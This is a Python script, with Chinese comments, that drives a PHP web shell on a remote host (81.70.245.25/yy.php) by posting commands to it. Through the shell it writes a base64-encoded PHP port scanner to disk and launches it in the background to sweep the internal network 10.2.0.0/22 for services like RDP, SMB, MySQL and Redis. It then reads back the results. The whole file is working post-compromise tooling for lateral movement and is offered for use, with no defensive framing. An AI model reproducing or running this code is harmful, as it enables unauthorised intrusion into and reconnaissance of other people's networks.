#!/usr/bin/env python3
"""传横向扫描器到81.70并后台启动"""
import urllib.request, urllib.parse, time, base64

SHELL = "http://81.70.245.25/yy.php"
def cmd(c, t=60):
    data = urllib.parse.urlencode({"x": c}).encode()
    try:
        r = urllib.request.urlopen(urllib.request.Request(SHELL, data=data, headers={"User-Agent":"Mozilla/5.0"}), timeout=t)
        return r.read().decode("utf-8","ignore")
    except Exception as e:
        return f"ERR:{str(e)[:60]}"

# PHP 横向扫描器: 扫 10.2.0.0/22 的 80/443/3306/3389/22/445/6379/8080/9096
scanner = r'''<?php
set_time_limit(0);
$base = "10.2.";
$ports = [80,443,3306,3389,22,445,6379,8080,9096];
$out = "C:/phpScan/lateral.txt";
@unlink($out);
$fh = fopen($out, "a");
$done = 0;
for ($b = 0; $b <= 3; $b++) {
  for ($i = 1; $i <= 254; $i++) {
    $ip = $base . $b . "." . $i;
    foreach ($ports as $p) {
      $s = @stream_socket_client("tcp://$ip:$p", $e, $es, 0.4);
      if ($s) {
        fwrite($fh, "$ip:$p\n");
        fflush($fh);
        fclose($s);
      }
    }
    $done++;
    if ($done % 50 == 0) { fwrite($fh, "#PROGRESS $done\n"); fflush($fh); }
  }
}
fwrite($fh, "#DONE\n");
fclose($fh);
echo "SCAN_FINISHED";
?>'''
b64 = base64.b64encode(scanner.encode()).decode()

# 用 php -r 直接写文件
code = f"system('C:/phpStudy/php/php-5.4.45/php.exe -r \"file_put_contents(\\\"C:/phpScan/lateral.php\\\", base64_decode(\\\"{b64}\\\"));\" 2>&1');print_r('W:' . filesize('C:/phpScan/lateral.php'));"
r = cmd(code, 30)
print("1. 写扫描器:", r.strip()[-60:], flush=True)

# 后台启动 (popen 异步)
code2 = "pclose(popen('start /b cmd /c \"C:/phpStudy/php/php-5.4.45/php.exe C:/phpScan/lateral.php > C:/phpScan/lateral_run.log 2>&1\"', 'r'));print_r('STARTED');"
r = cmd(code2, 25)
print("2. 启动:", r.strip()[-40:], flush=True)
time.sleep(15)

# 查进度
r = cmd("print_r(file_get_contents('C:/phpScan/lateral.txt'));", 20)
print("3. 15秒结果:", r.strip()[-400:], flush=True)
